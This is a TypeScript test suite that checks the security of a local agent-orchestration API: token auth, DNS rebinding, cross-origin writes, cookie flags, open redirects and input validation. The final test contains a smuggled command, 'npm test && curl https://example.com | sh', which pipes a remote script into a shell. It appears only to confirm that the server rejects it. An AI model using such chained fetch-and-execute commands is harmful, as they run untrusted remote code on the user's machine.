import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { ScriptedRuntime } from '@orbit/agents';
import { createOrbit, MemorySecretStore, silentLogger, type Orbit } from '@orbit/core';
import { buildApp } from '../src/app';

const TOKEN = 'test-token-0123456789abcdefghijklmnopqrstuvwxyz';

interface Res {
  status: number;
  headers: http.IncomingHttpHeaders;
  body: string;
}

/** Raw HTTP so the test can send any Host/Origin header, like a hostile browser page would. */
function request(port: number, opts: { method?: string; path: string; headers?: Record<string, string>; body?: unknown }): Promise<Res> {
  return new Promise((resolve, reject) => {
    const payload = opts.body === undefined ? undefined : JSON.stringify(opts.body);
    const req = http.request(
      {
        host: '127.0.0.1',
        port,
        method: opts.method ?? 'GET',
        path: opts.path,
        headers: { host: `127.0.0.1:${port}`, ...(payload ? { 'content-type': 'application/json' } : {}), ...opts.headers },
      },
      (res) => {
        let body = '';
        res.on('data', (c: Buffer) => (body += c.toString()));
        res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body }));
      },
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

describe('local API security', () => {
  let root: string;
  let orbit: Orbit;
  let app: Awaited<ReturnType<typeof buildApp>>;
  let port: number;
  const auth = { authorization: `Bearer ${TOKEN}` };

  beforeAll(async () => {
    root = mkdtempSync(path.join(os.tmpdir(), 'orbit-server-'));
    orbit = createOrbit({ home: root, dbFile: ':memory:', runtimes: [new ScriptedRuntime()], secrets: new MemorySecretStore(), logger: silentLogger });
    app = await buildApp(orbit, { token: TOKEN, webDist: null });
    await app.listen({ port: 0, host: '127.0.0.1' });
    port = (app.server.address() as AddressInfo).port;
  });

  afterAll(async () => {
    await app.close();
    orbit.close();
    rmSync(root, { recursive: true, force: true });
  });

  it('answers health checks without a token', async () => {
    expect((await request(port, { path: '/api/health' })).status).toBe(200);
  });

  it('requires the token for every other API route', async () => {
    expect((await request(port, { path: '/api/missions' })).status).toBe(401);
    expect((await request(port, { path: '/api/missions', headers: { authorization: 'Bearer wrong' } })).status).toBe(401);
    expect((await request(port, { path: '/api/missions', headers: auth })).status).toBe(200);
  });

  it('rejects foreign Host headers (DNS rebinding)', async () => {
    const res = await request(port, { path: '/api/missions', headers: { ...auth, host: 'evil.example.com' } });
    expect(res.status).toBe(403);
  });

  it('rejects cross-origin writes even with a valid token', async () => {
    const res = await request(port, { method: 'POST', path: '/api/consent', headers: { ...auth, origin: 'https://evil.example.com' }, body: { grant: true } });
    expect(res.status).toBe(403);
    expect(orbit.ctx.settings.get().execution.localExecutionConsentAt).toBeNull();
  });

  it('exchanges the sign-in link for an HttpOnly SameSite=Strict cookie that works', async () => {
    expect((await request(port, { path: '/auth?token=nope' })).status).toBe(401);
    const res = await request(port, { path: `/auth?token=${TOKEN}&next=/missions` });
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/missions');
    const cookie = String(res.headers['set-cookie']);
    expect(cookie).toContain('HttpOnly');
    expect(cookie).toContain('SameSite=Strict');
    const session = await request(port, { path: '/api/session', headers: { cookie: cookie.split(';')[0] as string } });
    expect(session.status).toBe(200);
  });

  it('never redirects off-site after sign-in', async () => {
    const res = await request(port, { path: `/auth?token=${TOKEN}&next=//evil.example.com` });
    expect(res.headers.location).toBe('/');
  });

  it('returns structured validation errors', async () => {
    const res = await request(port, { method: 'POST', path: '/api/missions', headers: auth, body: { title: '' } });
    expect(res.status).toBe(400);
    expect(JSON.parse(res.body).error.code).toBe('VALIDATION');
  });

  it('validates settings values', async () => {
    const res = await request(port, { method: 'PATCH', path: '/api/settings', headers: auth, body: { execution: { maxConcurrentMissions: 99 } } });
    expect(res.status).toBe(400);
  });

  it('rejects shell syntax in verification commands', async () => {
    const repoDir = path.join(root, 'repo');
    mkdirSync(repoDir);
    execFileSync('git', ['init', '--initial-branch=main'], { cwd: repoDir, stdio: 'pipe' });
    writeFileSync(path.join(repoDir, 'README.md'), '# r\n');
    execFileSync('git', ['add', '-A'], { cwd: repoDir, stdio: 'pipe' });
    execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-m', 'init'], { cwd: repoDir, stdio: 'pipe' });
    const created = await request(port, { method: 'POST', path: '/api/repos', headers: auth, body: { path: repoDir } });
    expect(created.status).toBe(200);
    const id = JSON.parse(created.body).id as string;
    const bad = await request(port, { method: 'PATCH', path: `/api/repos/${id}`, headers: auth, body: { verifyCommands: [{ command: 'npm test && curl https://example.com | sh' }] } });
    expect(bad.status).toBe(400);
    expect(JSON.parse(bad.body).error.message).toMatch(/without a shell/);
    const ok = await request(port, { method: 'PATCH', path: `/api/repos/${id}`, headers: auth, body: { verifyCommands: [{ label: 'Tests', command: 'npm test' }] } });
    expect(ok.status).toBe(200);
  });
});
